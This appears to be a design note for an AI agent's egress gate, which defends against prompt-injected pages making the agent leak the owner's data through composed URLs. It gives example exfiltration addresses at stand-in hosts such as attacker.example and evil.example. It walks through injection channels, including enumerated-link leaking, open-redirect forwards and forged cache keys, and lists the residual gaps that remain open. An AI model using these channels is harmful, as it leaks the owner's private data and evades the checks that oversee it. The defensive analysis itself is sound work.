**The question is TAINT, not who pressed start (2026-08-22).** For a year the gate above returned on its very first line whenever `origin == "user"`, on the reasoning that an attended owner can see the host for himself. Both halves of that turned out to be false. The owner said plainly he will not read a card per action — *"there's this decision fatigue if I have to please click approve for every action. It's not gonna happen"* — which makes attended and unattended the same session with a different label. And the risk was never the host anyway: it is that the URL may have been **composed from text on a page** rather than by him. The measured consequence was that `read_url("https://attacker.example/?d=<his invoice>")` was **auto-approved in every attended session**, with no credential stored anywhere and no button pressed — the entire injection payoff, defended by an echo line in a chat nobody is watching.

So the gate asks `self._tainted` instead: has anything from **outside this machine** entered this task? `UNTRUSTED_SOURCE_TOOLS` is `EGRESS_TOOLS | BROWSE_TOOLS`, plus **every plugin tool** — a wrapper is arbitrary code and its manifest never says where its bytes came from. `_note_taint` is applied at the turn boundary, once per batch — see **provenance is captured per call and committed per turn** below for where, and why those are two different places. Applying it *after* the batch is not a race: composing an exfiltration URL requires having READ the thing being exfiltrated, so the content came back on an earlier model call and the flag is always up before the model that saw it speaks.

**A tainted ATTENDED turn gates only what CARRIES something, and that narrowing is what keeps the fence usable.** A plain address to an unfamiliar host *is* reading the web; gating it would put a card in front of every follow-up read in every session — the "gating everything makes the system unusable" failure #198 names in its own constraint section. `_carries_payload` is therefore the second test: a query, a fragment, userinfo, a path past `PLAIN_PATH_MAX`, or a hostname label past `HOST_LABEL_MAX`. **A triggered session keeps the stricter rule** — every novel host, plain or not — since nobody sees the answer either way.

**A search NAMES a host; it never reaches one (2026-08-23).** `web_search` used to count as carrying unconditionally, on the reasoning that the query is the outbound payload and only named a host at all because something composed it. Measured against a real session, that is false twice over. The query is handed to the SEARCH ENGINE and to nobody else — `site:fly4free.pl weekend` *restricts the index*, which is the opposite of a destination, and a bare domain in a query is a search term — so a flight search that had read one page drew a card per follow-up saying aish *"wants to send something to fly4free.pl"*, an action that was not going to happen in front of the most ordinary research move there is. A card that describes something nobody is doing is worse than no card, because it is how the words on every other card stop meaning anything.

So `_carries_payload` asks the query the same question it asks a URL: is there an ADDRESS here with data stapled to it — `_addresses_in_text` (narrower than `_HOST_TOKEN_RE` on purpose: a host with a path, query or fragment, or an http(s) scheme) fed to the shared `_address_carries_payload`. No real search has that shape, so the one hold left costs nothing. The card text is split too, since a search and a visit are not the same sentence. A triggered session is unchanged — every novel host in a query still holds there, only now the card says *search for* rather than *reach*.

**Two holes in that narrowing, found by asking the question again after it shipped (2026-08-23).** Both were live, and both are the same mistake: a test that was skipped rather than answered.

- **A host already in provenance skipped the payload check entirely.** The novel-host list was computed, found empty, and returned before `_carries_payload` was ever consulted — so naming a host once made it an open sink for as much data as fits in an address. Naming a host is not vouching for unlimited data going to it; he may have pasted a link somebody sent him. The payload question is now asked of every host, and the card says the true thing when he DID name it (*"send data to eon.pl in the address itself"*, not *"a host you did not mention"*).
- **The path budget bounded a trickle instead of closing it** — at its old size, roughly ninety bytes a call to anywhere. `PLAIN_PATH_MAX` is tight now, and the reason it can be tight is that the offered-link test is hoisted ABOVE it: a link that really was offered is excused before the bound is consulted, so what reaches it is an address the model **composed**, and a composed path with sixty characters in it is not one anybody typed. It bounds a trickle rather than sealing it, and saying so is better than implying otherwise.

**What the offered-link escape is sound against — the real bound is ENTROPY, not "he cannot write the URL".** This paragraph used to claim the attacker would have to WRITE the finished URL into the page and cannot, because the thing he is trying to steal is the thing he does not know. That is true for a secret he cannot enumerate and **false for a low-entropy fact**: a hostile page can write one link per possible answer (`/a1`, `/a2`, …) and inject *"open the one that matches"*, learning log₂N bits per read with no card and nothing to distinguish it from ordinary link-following. So the honest statement is the narrow one — a *composed* URL carrying an appended secret cannot match a page-authored link, which is what stops the escape becoming a high-bandwidth sink. It is not a barrier against an enumerated answer. That channel is **not created by the escape and is not closed by removing it**: a plain short-path URL at a novel host carries no payload and is free anyway under the taint narrowing above, which is the #198 usability constraint doing exactly what it was built to do. Tracked as its own issue rather than smuggled into a fix for something else, and #294 settled it by ACCEPTING it — see the offered-link paragraph below for the decision and what it forbids. Where the escape is separately weak is as an authorisation to *read*: a hostile page can offer a deep link into another signed-in account.

**Searching is not an egress (#293).** Finding information is the first half of reading it, so a search is a read whichever tool performs it — and the two tools disagreed. Through `web_search` the same act drew nothing (the query goes to the search engine and to nobody else, above); through `read_url` on a site's own search box it drew a card, purely because a `?query=` was the mechanism. A mechanism word was deciding a permission. What made it unanswerable rather than merely noisy is that the hold was keyed to the **URL string**: every other grant in aish is once per site, per form, per link, and this one was once per search term, which never repeats. So the card count grew with how well the research was going — six in one task about the same shop (`session-20260823-201444-431613`, wiper blades on allegro.pl), each one approved, none of them covering the next. That is the shape that teaches the owner to tap a card blind, which is worse than no card because it records a consent he never gave.

`_searching_a_vouched_site` frees a composed query when every host on the call is one the owner **vouched on a card** — `_approved_hosts`, never `_owner_hosts`. That asymmetry is the whole safety of it and it looks backwards until you see what it stops: a host lands in `_owner_hosts` merely for appearing in text he typed **or pasted**, so an address inside a forwarded email is owner-authored by provenance and attacker-chosen in fact. A mention is not a vouch, the bullet above stands unchanged, and the first payload to a merely-mentioned host still asks. What is new is only that his answer **lasts** — the grant was always recorded and the payload branch then ignored it, which is why six identical cards could be approved six times and change nothing.

**No length cap on a vouched host's query, deliberately.** A cap does not close the channel — an injection chunks a secret across many short, ordinary-looking searches and stays under any bound worth having — so its only real effect would be to start nagging again on the faceted-search URLs real shops build. The bound that works is the destination, and it is enforced before this test is reached: an unvouched host still gates, carrying or not. What a vouch does not cover is an address aimed somewhere else from inside the query — an open redirect, an SSRF forward, userinfo — because those name a second destination he was never shown; `_forwards_elsewhere` gates on the PRESENCE of a nested address rather than asking whether that address itself carries anything, since in a redirect parameter the bare forward IS the payload. Its own limit is written in its docstring and pinned by a test: a **bare-host** redirect value (`?to=evil.example`, no scheme, no path) is not caught, because catching it would mean gating every search whose terms look like a domain. A bare host is a hop, not a payload. This closes scheme-bearing and pathed forwards out of a vouched site; it does not close open-redirect exfiltration in general.

**The residuals, plainly — and each one now has a test rather than only a paragraph (#294).** *(a)* A host the owner approved on a card accepts an arbitrary plain query for the rest of the session without further cards. That query reaches only that host's own search index and access logs — a channel the attacker cannot read back unless he controls that host, in which case the owner approved the attacker's own hostname and the game was lost at the card, not at the query. It is the same residual `web_search` already accepts (`test_a_vouched_host_accepts_any_query_for_the_rest_of_the_session`). *(b)* The redirect check gates scheme-bearing and pathed forwards out of a vouched site; a **bare-host** value is not caught, because catching it would gate every search whose terms look like a domain. A bare host is a hop, not a payload, and this does not close open-redirect exfiltration in general (`test_the_bare_host_forward_is_a_known_residual`). *(c)* A `web_search` card can name several hosts and vouches ALL of them, so the grant is only as legible as that card. That one is a real invariant rather than an accepted cost: what enters `_approved_hosts` is exactly the set the preview put in front of him, so a multi-host card cannot grow silently (`test_a_multi_host_search_card_vouches_exactly_the_hosts_it_named`). Still gated: any unvouched host (payload or not), a nested second address, userinfo, and a path or host label past the bounds.

**The vouch OUTLIVES the agent, because the chat does (#341).** `_searching_a_vouched_site` says his answer now LASTS and `_egress_gate`'s own comment says it holds "for the rest of this session" — and `_approved_hosts` was in memory only, so it lasted as long as the Agent object. A chat outlives that object: every ship rebuilds one underneath an open chat. Measured, not inferred — `session-20260830-124807-752582` drew two cards for allegro.pl in ONE session, records 816 and 1093, the second after the first was approved. `_vouch_hosts` writes an `egress_vouch` record at the plain-approve line and nowhere else (an `Approved(comment)` is a HOLD — the call never ran, so there is nothing to have vouched for), `SessionLog.egress_vouches` reads it back superseded-aware, and `restore_egress_vouches` re-arms it on rebuild beside the site grants. `ClaudeMaxAgent` forwards it by hand like every other piece of restored state, which is #311's lesson stated once more: that backend owns its own loop, so a seam `server.py` appears to cover generically covers it only where it is forwarded.

**Its own record kind, and that is a security decision rather than tidiness.** `SessionLog.GRANT_KINDS` feeds ONE reader whose output is restored into `_approved_sites` — a set matched by SUFFIX (`_site_granted`) and licensing aish to PRESS things on a site as the owner. `_approved_hosts` is matched EXACTLY and licenses data riding an address. The two answer different questions and are kept disjoint by construction: neither set is ever filled from the other's card or the other's record. Adding `egress_vouch` to the shared tuple would have promoted every "yes, read allegro.pl" already on disk into "yes, drive allegro.pl and everything under it", silently, on the next reopen. Both directions are pinned (`test_a_read_vouch_never_licenses_driving`, `test_a_press_grant_never_licenses_egress`), and so is residual (c) surviving the round trip — what comes back is exactly the hosts the card named. `TestTheEgressVouchOutlivesTheAgent`.

**One answer per read, whichever tool carries it (#341).** `EGRESS_TOOLS` held `read_url` and not `browse`, so the identical page was carded one tool over and free the other — a mechanism word deciding a permission, which is the bypassability #287 fixed *inside* the browse gate surviving one layer up. Two things had to move together and neither is visible from the other: `browse` joins the tool set, AND `_egress_novel_hosts`' name branch learns that browse's opening address lives in `url`. Listing it in the set alone fails OPEN — the call would drop into the `web_search` else-branch, read a `query` argument browse does not have, find no hosts in an empty string and be freed. `test_naming_browse_in_the_tool_set_alone_would_not_have_worked` pins that, because it is invisible in a diff. **Only the OPEN.** `browse_act`/`browse_fill` navigate from controls the PAGE wrote rather than an address the model composed, and what may be typed into them is the typing fence's question (#310), not this one.

**The unattended half of that was a live hole, not a symmetry point.** The `BROWSE_TOOLS` dispatch branch asked `_mail_link_gate` and `_browse_gate`, and `_browse_gate` has no origin arm at all — `if not host or reading: return None`. So a triggered session could open `https://attacker/?d=<data>` in real Chrome with only the mail-link rule in the way, and the strict unattended egress rule never saw it. The branch now calls `_egress_gate` after `_mail_link_gate`, mirroring the `READ_ONLY_TOOLS` branch below it; it is a no-op for the two press tools, which are not in `EGRESS_TOOLS`. This TIGHTENS triggered sessions, and the email agent is a live user of that path: a browse-open at a host the owner never named now holds for approval there, payload or not, exactly as `read_url` already did. `TestOneAnswerPerReadWhicheverTool`.

**The two grants are disjoint by construction, and the code says so in both places.** `_approved_hosts` is EXACT-matched and answers *may data ride this address*; `_approved_sites` is SUFFIX-matched and answers *may aish press things here as him*. The read question is never routed through `_site_granted`, and neither set is ever updated from the other's card or restored from the other's record. A read-vouch that licensed driving, or a press grant that silently covered subdomain egress, would be a permission nobody was shown.

**Unattended got the same question, in the stricter direction (#293).** The triggered branch returned on `novel or None`, so a host already in provenance was freed with **no payload check at all** — laxer, unattended, than the attended path it exists to be stricter than, and an injected worker could put anything it liked into an address at a host the owner had once mentioned. It now asks `_carries_payload` of a known host exactly as the attended path does. The novel-host rule is untouched: every novel host still gates, payload or not, because nobody sees the answer either way. `TestSearchingIsReading`.

## The payload predicate reads the VALUE, not the shape of the address (#341)

**The measured failure.** `_address_carries_payload` fired on any query, any fragment, userinfo, a path past `PLAIN_PATH_MAX` or a host label past `HOST_LABEL_MAX`. Run against the five distinct real URLs the owner was carded on between 2026-08-24 and 08-30 — a GitHub blob path, a Reddit thread, an Amazon product page and two Allegro listing searches — **all five return True**, and the card then asserted *"wants to send something"* about every one of them. That is a cause no line of code established, on 18 of the 33 web-acting cards in a week, and it is an L8 violation before it is a usability one: a card that describes something nobody is doing is how the words on every other card stop meaning anything.

**An ATTENDED turn now asks `Agent._value_finding`; a triggered session keeps the whole of the old rule**, because nobody sees the answer there and nothing is being traded for legibility. `PLAIN_PATH_MAX` retires for attended turns only. `HOST_LABEL_MAX` stays in both — a label past forty characters is DNS-tunnel-shaped and fires on no real host. `web_search` is untouched in both origins: a search names a host and never reaches one, so the destination arm below has nothing to ask about, and the corpus that motivated this is entirely reads.

Six arms, and **every one of them is a fixed rule**. Nothing here judges whether something *looks like* data, which epic #295 P3 bars outright — anything that GRANTS permission is a fixed rule, an external fact, or the owner's own act — so a wrong arm can only ever draw a card that was not needed.

1. **Userinfo**, unchanged.
2. **A nested address** in query or fragment — `_forwards_elsewhere`, unchanged, bare-host residual included.
3. **One of his stored secrets, verbatim**, anywhere in the percent-decoded URL, through the same `secrets.contains` primitive `_command_has_a_secret` uses. Zero false positives on faceted search by construction: a shop's filter is not his password. The card names the finding and never repeats the value.
4. **An opaque token** — `_opaque_run`. Percent-decode, cut query, fragment and path into runs of letters and digits, fire on 20 characters mixing three character classes or 32 of pure hex. **Two details came from the corpus disagreeing with the first version of the rule, which is what P4's "grown only from measurement" means in practice**: `-` and `_` had to become separators rather than token characters (with them inside a token the corpus' own Amazon page reads as a 27-character three-class run and fires), and the class count had to be three rather than two (two catches every `bosch-…-ar26u-…-2024` product slug on the Polish web). Reddit ids are 7 characters, ASINs 10, YouTube ids 11 — all clear of the bound; `CAESaQ…` redirect blobs and AWS-style signatures fire. It is a structural check over character classes and **not a vocabulary**: there is no list of prefixes or charset names here to match against anything a page wrote.
5. **The destination.** Any query or fragment at a host with **no provenance** — not vouched on a card, not the exact URL a result offered — still draws one card, attended. **This arm is load-bearing and is the reason the rival predicate was rejected** (below). Provenance here means VOUCHED-OR-OFFERED and a mere mention is deliberately not enough: that asymmetry is #293's recorded decision, since a host lands in `_owner_hosts` merely for appearing in text he typed *or pasted*, so an address inside a forwarded email is owner-authored by provenance and attacker-chosen in fact. With #341's first slice persisting the vouch, this costs **one card per host per chat, ever**.
6. **`HOST_LABEL_MAX`**, unchanged, both origins.

**The card now says what a line checked.** The finding and the decision are computed by the same function (`_payload_finding`), so the sentence cannot drift from the reason: *the address it built for X carries one of your stored secrets* / *has a second address written inside it* / *carries a 46-character run of random-looking text* / *carries a query, and nothing in this chat has agreed to send anything there* / *hides a 50-character run inside the hostname*. Never a tool name, never *browse* or *drive* (P1). A gate that knows only *something* can only say *something*, which is why the boolean and the sentence had to become one thing rather than two that agree.

**What this does NOT narrow.** A vouched host is unchanged in both directions — `_searching_a_vouched_site` still runs after the predicate and frees anything that is not a forward, so residual (a) stands exactly as #294 records it. The enumeration residual stands too: a short plain path at a novel host carries nothing and is free. This is a narrowing of the CARD, not of the refusal set.

### The design note: the rival predicate, and why it was not built

The rival is the issue's own literal wording — **a pure value-shape predicate with no destination term**: fire only when the address carries an address-shaped token or a secret-shaped/high-entropy run. It is simpler, it needs no provenance, and it was rejected for two reasons that are worth keeping written down.

- **It frees full-bandwidth semantic exfiltration.** An injected page composes `https://attacker.example/lookup?q=<the owner's mail summarised in plain words>`. Low entropy, no nested address, no secret verbatim — it passes every value arm and goes free, silently, attended, to a host nobody named. That is strictly worse than the enumeration residual #294 accepted, which leaks log₂N bits per read; this leaks a paragraph. `_searching_a_vouched_site`'s own docstring already records why a length cap cannot close the chunking channel and states that *the bound that does work is the destination*; arm 5 is what keeps that sentence true after the any-query trigger retires.
- **The two halves of it cannot both be tuned.** An entropy threshold loose enough to pass a `goto?url=CAES…` redirect blob is by construction too loose to catch a base64-encoded secret, which is the same alphabet at the same length. Any bound that lets ordinary redirects through lets the payload through with them.

**A judged "does this look like data" classifier is barred, not merely unattractive.** P3: anything that GRANTS permission is a fixed rule, an external fact, or the owner's own act. A classifier freeing an egress is a judged verdict making things LESS safe, which is the direction the law forbids outright — so it was never a candidate, however much better it would score.

**Law B, measured.** Both comparisons are tests, on the incumbent's own record. **At the gate, on the recorded corpus** (15 cards, 08-24→08-30, verbatim from #341): against the bare predicate with no provenance the incumbent fires **15/15** and the new arm **7/15**; against the *honest* incumbent — the banner fix plus #341's slices 1-2 plus the old predicate, which is what the owner would actually have today — the incumbent fires **10/15** and the new arm **3/15**. All three survivors are the FIRST query at allegro.pl in a chat, one per chat, which is arm 5 doing exactly what it exists for; the issue's own "zero fire" acceptance and its arm-5 specification pull against each other on this corpus, and arm 5 won because without it the paragraph above goes free. **On composed exfiltration addresses** — a secret appended verbatim, a base64 blob of stolen text, a nested second address, userinfo, and a plain-language question at an unvouched host — **both arms fire on all five**. `TestThePayloadPredicateReadsTheValue`, `TestTheEgressCardSaysWhatALineChecked`, `TestTheRecordedCorpusAndTheComposedAddresses`.

**What the corpus test reconstructs, stated because the numbers depend on it.** Four of the fifteen recorded addresses have the middle of their path elided in the issue, and the issue groups the cards by DATE rather than by session id. The elided tails are completed with the shape the rest of that address plainly has, and a chat is taken to be a day — the one place the record says otherwise (08-30, *"same session, same host"*) agrees with that grouping.

**A link the page offered is followed, not gated — and the source of that fact is a RECORD, not a text search (#294).** `_note_offered_links` writes every address a tool result carried into `_offered_links` as the result arrives, and `_url_was_offered` asks that set. The property that makes the excuse sound is unchanged: a *composed* URL cannot match, because appending stolen data changes the string — so walking a listing to an offer costs nothing while smuggling to the same host does not, and the difference needs no judgement about intent.

It used to substring-match the proposed URL against every tool message in the task, and that was wrong in a way worth keeping written down. aish's own **source header** — the `[<url>]` line `web._present` puts above a page, and `[<url> — rendered in the browser]` for a browser read — echoes the address aish was ASKED to fetch back into the very text being scanned. So every **prefix** of an address already in the history read as "the page offered this". Not exploitable for exfiltration (smuggling appends, and a longer string cannot be a substring of a shorter one), which is why this is a legibility bug rather than a hole: it falsified the rule the gate states, and it made two near-identical addresses get different answers for a reason nothing on screen could explain. The record drops the URL the call itself requested for the same reason — that echo is aish's sentence, not the page's. The old length floor ("too short to be distinctive") went with the substring scan: an exact match against a link a page really showed is distinctive however short it is. The set is per TASK, like taint and like the mail-link map, because the gate that consults it only exists while a task is tainted; it costs nothing, being a projection of strings `self.messages` already holds. `test_a_prefix_of_an_address_already_fetched_is_not_offered`, `test_aishs_own_source_header_is_not_something_a_page_offered`. This set is written by `_commit_provenance`, on every backend — see the capture/commit paragraph below for why that sentence is worth stating at all.

**The banner is the line between aish's voice and the source's, so the scan stops at it (#313).** #294 dropped ONE of aish's own sentences from the record — the URL the call requested — and left the rest, which is a rule about an instance rather than about a class. `web.STALE_SESSION_NOTE` is composed by aish, prepended to a `read_url` result, and says *"tell them to run /browser https://{host}"*; `_note_offered_links` scanned the whole string, so that host was written down as a link **the page offered**. Nearly harmless in practice — a bare host has no path, query or fragment, so `_carries_payload` was never going to fire on it, and it is a host the owner demonstrably has a relationship with, since a stored sign-in there is why the note exists — and worth fixing for #294's own reason: the defect was never exploitability, it was that the invariant the gate STATES was not the invariant the code ENFORCED. A durable record is exactly the thing the next person leans on.

The fix is structural rather than a second list of aish's sentences to keep in step with the first: `UNTRUSTED_NOTE` already separates aish's voice from the source's, every `[aish: …]` note sits above it by construction, and so the scan takes only what is BELOW it. Partitioning on the FIRST occurrence is what makes that safe against a page that embeds the banner text itself — the real banner always precedes page content, and a later copy can only widen the scanned half, never narrow it. Two consequences worth stating:

- **The requested-URL drop SURVIVES; the banner does not subsume it.** `web._present` puts the `[<url>]` source header BELOW the banner (`UNTRUSTED_NOTE + f"[{source}]\n…"`), and `_present_page` does the same with `[<url> — you are driving this page]`, so aish's echo of the address it was asked to fetch lands in the half that is scanned. Moving those headers above the banner would subsume it and is a separate change to what the model reads — not a rider on this. One residual is worth naming: `browse_act`/`browse_fill` take a control, not a URL, so `requested` is empty for them and the head's `[<current page> — you are driving this page]` still lands in the record. Benign — that address is where the session already IS, arrived at by navigation rather than composed — and unchanged by #313. The other one is `secrets.scrub`, whose redaction marker names the credential it removed (`[secret sign-in for https://<origin> — redacted by aish]`) and substitutes it wherever the password appeared, which is inside the body. Also a bare origin, so also payload-free. Both are the same class as this issue and neither is worth a second mechanism; the honest fix for both is to move aish's sentences above the banner, which is a change to what the model reads and belongs in its own issue. `test_aishs_own_source_header_is_not_something_a_page_offered`.
- **A result with NO banner now records NOTHING.** That is a deliberate call and it is the conservative one: no banner means nothing in the string says whose words these are, and a set documented as "what the source offered" must not be filled from unattributed text. It narrows the record well past the stale-session note — a URL aish composed in `show_image`'s video line (`[![still](path)](https://www.youtube.com/watch?v=…)`, an address that DOES carry a query), links in a mail tool's output, links in shell output, links in a local doc all stop counting as offered. Every one of those is a call that used to be excused and is now gated, which is the only direction this may move: the set exists solely to EXCUSE, so an address missing from it is asked about rather than waved through. It had one named cost, split out as #314 and fixed there: a CONTINUATION arrives bannerless, so page 2 of a cut page stopped being attributable at all — see the paragraph below. `test_a_result_with_no_banner_offers_nothing`, `test_a_note_aish_wrote_is_not_something_a_page_offered`.

**A continuation carries its SOURCE's provenance, because the store holds the page body and the banner is prepended after it (#314).** `read_tool_output` pages a cut result back out of the content-addressed continuation store, and that store keeps the text as the producing tool made it — `web._present` prepends `UNTRUSTED_NOTE` afterwards. So a continuation arrives with nothing in the string saying whose words it holds, and the scan above read every one of them as unattributed text. Two consequences, and the order matters:

- **The taint half did not fail safe, and it is the reason this was worth doing.** `_note_taint` saw the call as `read_tool_output`, which is in neither `UNTRUSTED_SOURCE_TOOLS` nor the plugin map, so paging a fetched page raised nothing. Taint is per TASK and the store outlives the task, so a page read in one task and PAGED in the next brought the outside in while the fence stayed down for the whole of that second task — `_egress_gate` returning on its first line however hostile the page was, which is the #277 condition exactly, reached through a door #311 had just finished closing on another backend. `test_paging_a_web_read_raises_the_taint_fence`.
- **The offered-link half failed safe and was still worth fixing**, for #294's own reason: page 1 and page 2 of ONE read answered the same question differently, and nothing on screen explained why. A link carrying a query drew a card on page 2 that its identical twin on page 1 did not.

**Bannering the continuation is the wrong repair, and the reason is structural.** The same store pages shell output (via `_trim_tool_message`) and plugin output (via `tool_plugins.envelope`) through the same door. Marking this machine's own command output as attacker-controlled would teach the model to discount its own shell, and would put an injection banner on text no attacker wrote.

**So the fact travels with the entry.** `store_continuation` takes a `ContinuationSource` — the producing `tool`, whether its bytes are `untrusted`, whether addresses in them are the source's (`offers`), and the URL the call `source`d — and writes it to a `<digest>.src` sidecar beside the bytes; `continuation_source` reads it back and `_commit_provenance` asks the entry instead of sniffing the string. **This is #311's repair one layer over, and that is the general shape worth naming: whether text came from outside is known when it is CAPTURED, and re-deriving it later by looking at the string is the same class of mistake as #294's substring search for offered links.** Five things a reader should not have to re-derive:

- **`offers` is deliberately three-valued.** True at the page-cut door (`_page_cut` → `_stash_page`), because what is stashed there is the body that `_present` will put below the banner — so page 2 is the source talking exactly as page 1 was. False at the plugin door, because a plugin result is never bannered and page 1 offered nothing either. **None at the trim door**, meaning *the bytes carry their own attribution*: `_trim_tool_message` caches the message as the model HAD it, banner and `[aish: …]` notes included, so the existing partition is already the right answer there and forcing a boolean would either regress page 1 or re-open #313.
- **Provenance is not put in the KEY, and that is a security decision rather than a style one.** The key already carries the shown-length (`<digest>s<shown>`) and is handed to the model, which can invent one. A key that asserted its own provenance would let a model page shell output back under a `read_url` label and have the addresses in it excused — a composed exfiltration URL laundered into `_offered_links` through a string it typed itself. The sidecar is never named to the model.

**The rule that bullet is an instance of: a handle aish hands the model is the model's to NAME and not the model's to CHARACTERISE.** Provenance travels beside the handle, never inside it. A continuation key, a media id, a session name, a tool-output digest — each is a string aish gives the model so it can ask for something back, and each is therefore a string the model can also invent or edit. Anything the harness would BELIEVE on the strength of that string is a fact the model gets to assert about itself. This is the same shape as a page's own label not deciding a permission (`docs/browser.md`), one layer down: the label is written by the party the check exists to constrain. The test for a new handle is one question — *if the model made this up, what would the harness conclude?* If the answer is anything but "nothing", the fact belongs beside the handle in a record the model cannot name.
- **Only a call that SERVED cached text is attributed.** `_continuation_source` reads the envelope (`source: "cache"` plus a byte count, written on that path alone) rather than the text. An unknown key, a page past the end and an internal crash are all aish's own sentences — and one of them contains the aish install URL, so attributing them to a source would re-open #313 through the back door. `test_a_key_that_serves_no_text_attributes_nothing`.
- **Bytes with no record are treated as outside content that offers nothing.** Entries cached by an older aish carry no sidecar, and `UNKNOWN_CONTINUATION` answers both questions conservatively at once. It costs a taint that today would not rise, on at most the entries already in the store when this shipped; the alternative is the un-safe direction on exactly the case that motivated the fix.
- **The sidecar is part of its entry and never an entry of its own.** `prune_continuations` enumerates `*.txt` and unlinks the `.src` with the bytes it describes. Counting sidecars would halve `CONTINUATION_MAX_FILES`; evicting one alone would silently un-attribute bytes that are still there, which is this issue again. `test_the_record_is_part_of_its_entry_and_never_an_entry_itself`.

**The bound on the relaxation, stated plainly: a continuation can never be excused for links its own source did not offer.** `offers=True` scans the bytes that entry holds and nothing else, the requested URL is still dropped (`_present` puts the `[<url>]` header inside the stashed body), and a URL COMPOSED from an offered one is a different string and still gates — smuggling appends. Page 2 gets exactly what page 1 got. `_brings_outside_content` is `_note_taint`'s predicate, split out because the store must answer the same question at CACHE time for a reader that will see the bytes long after the call is over; its one added rule is that a tool which takes a local path as readily as a URL (`DUAL_SOURCE_TOOLS`) is assumed to have fetched when the args are no longer available, because taint failing to rise is the one direction this may never move. `TestAContinuationCarriesItsSourcesProvenance`, `TestACachedOutputCarriesWhereItCameFrom`.

**The cache is not a file, and the boundary is what says so (#317).** #314 gave the continuation door its provenance and left the store standing INSIDE `workspace_roots`, so the same bytes had two doors and only one of them asked anything. Through `read_file` a fetched page arrived **bannerless** (`web._present` prepends `UNTRUSTED_NOTE` after the body is stashed), **untainted** (a local read is in no untrusted-source set) and **unattributed** (the `.src` sidecar is consulted on the continuation path alone) — a hostile page readable as a file the owner owns, which is the #277 fence bypassed by a route that never asks. The bound on severity is real and worth stating rather than dressing up: the model has to go looking, choosing a digest-named path over the key it was just handed in the cut notice. It is closed for #294's reason — the invariant the code STATED was not the one it ENFORCED.

**The store leaves the boundary; the file layer does not learn a second provenance path.** Everything else in `workspace_roots` holds something a tool NAMED and told the model to go and read (#220) — a transcript, a rendition, a downloaded PDF, a picture. The cache holds tool output as the producing tool made it, `read_tool_output` is its purpose-built door, and no task wants `read_file` on a digest. Teaching `files.py` to read the sidecar would have been a second place that must not drift, which is exactly what #308/#309 spent a day removing. Four things fall out of it and none is optional:

- **The no-state-dir fallback moved too.** It was `scratch_dir/"tool-output"`, and scratch IS a root — so dropping the store from the list would have closed the door only where there is a state dir, which is to say everywhere except the tests that would have to prove it. It gets a temp directory of its own now, collected by a finalizer like the ephemeral scratch it used to hide inside.
- **It is REFUSED, not carded.** Left to the ordinary out-of-workspace prompt this would put a tap in front of a path nobody can read — a digest under a state directory — and a tap the owner does not understand is a tap he gives. The refusal NAMES `read_tool_output` and where the key comes from, because a block that hides the correct path is what manufactures the workaround; `never-edit-aish-itself` refusing a read-only grep of aish's own source is how a live token ended up in a log.
- **The question goes through `files.contains` (#309), not to the boundary.** `workspace_roots` is the session's roots plus aish's stores, so a root that happens to contain the state directory puts the cache back inside it, and a symlink from a project into the store resolves the same way. `_is_tool_output_cache` is asked in `_read_needs_prompt` — so the call leaves the parallel read path, which has no gate at all — and again in `_dispatch`, which is where it is refused.
- **The write side is the sharper half and is refused with it.** The sidecar is what says whether an entry's bytes came from outside and whether addresses in them are the source's, so a model able to `write_file` one could label URLs it composed itself as links a page offered — precisely the laundering that kept provenance OUT of the key, which the model can invent. `_dispatch_write` refuses before it plans, since planning an edit reads the file.

**Nothing is migrated, and nothing needed to be.** The store stays exactly where it was on disk (`<state_dir>/tool-output`, sidecars included); only its membership in the read boundary changed. Every key already handed to a model still resolves through `read_tool_output` — a key that stopped resolving mid-conversation is the one outcome this may not have. `TestTheToolOutputCacheIsNotAFile`.

**The audit #317 asked for, once, over every directory aish populates from outside.** The question is the same each time: does text from outside this machine become readable as a local file the owner owns?

- **Tool-output cache** (`<state_dir>/tool-output`) — the hole. Closed above.
- **Transcript store** (`<state_dir>/transcripts`) — **the same shape, and the one that was worth its own issue.** `read_media` converts a video's captions into a markdown rendition and NAMES it so the model can grep it (`docs/recordings-and-video.md`), which is why it is in the boundary. So a caption track written by whoever uploaded the video was read back through `read_file` bannerless and untainted, exactly as a cached page was. It differs from the cache in the one way that matters for the fix: `read_file` on it is the INTENDED call, so the answer was not to remove the door but to make the rendition carry its source — the #314 repair a third time. Closed by #319, below.
- **Document store** (`<state_dir>/documents`) — the same again and one notch sharper, because `_resolve_pdf` writes a PDF *fetched from a URL* into it and `documents.convert` puts the rendition beside it. Both are reachable with `read_file`. Same verdict, same fix, closed by #319.
- **Browser downloads** (`<state_dir>/browser/downloads`) — a file a `browse_act` pulled off a page, in the boundary so `read_pdf` can open what the tool just named. Outside content by construction; a `.txt` there read as a local file. The narrowest of the three since the owner approved the browse session that fetched it, and the one #319 covers by the ABSENT-RECORD rule rather than by a recorded fact — see below.
- **Media store** (`<state_dir>/media`) — see the paragraph below; #318's verdict, and what enumerating it actually found.
- **Uploads** (`<state_dir>/uploads`) — appended to `roots` by the server AFTER `restore_workspace`, which is correct (a process-owned root must not be dragged into the session's authoritative rebuild). The owner put the bytes there himself; that a forwarded PDF may be hostile is the mail-link/taint question and not this one.
- **Scratch workspace** — the MODEL writes it, so anything from outside that lands there was already in its context. Nothing is laundered by reading back what it just wrote.
- **Session logs, the evidence store, the knowledge tree** — all hold outside content and NONE is in `workspace_roots`; `read_file` on any of them is an ordinary out-of-boundary read. `import_skill` is the door into the knowledge tree and has its own consolidated review (`docs/knowledge-layer.md`).
- **Evidence frames** (`<state_dir>/frames`) — pictures of pages aish drove, which IS outside content written unprompted, and which was inside the boundary until #318 because it shared the media store. Now out, and refused directly as well as omitted. Below.

The honest summary: #317 was one instance of a class with four members. The other three were open in the *usable* direction — the model is meant to read those files — so the repair is provenance travelling with the rendition, not a door removed. One issue for the class rather than three for the instances, which is #319.

**Provenance travels with the artefact, and the door stays open (#319).** The three above are the OPPOSITE case to the cache: `read_file` on a rendition is the intended call, because `read_media` and `read_pdf` name the file so the model can grep it, seek in it and read a page at a time — "read it like a file" is the whole design (`docs/recordings-and-video.md`, `docs/documents-and-pdf.md`). Removing the door would remove the feature, so the fact rides beside the bytes instead: `provenance.record_artefact` writes a `<artefact>.src` sidecar at the moment the artefact is written, `provenance.artefact_source` reads it back, and `Agent._artefact_source` asks it on every `read_file`. `TestARenditionCarriesWhereItCameFrom`.

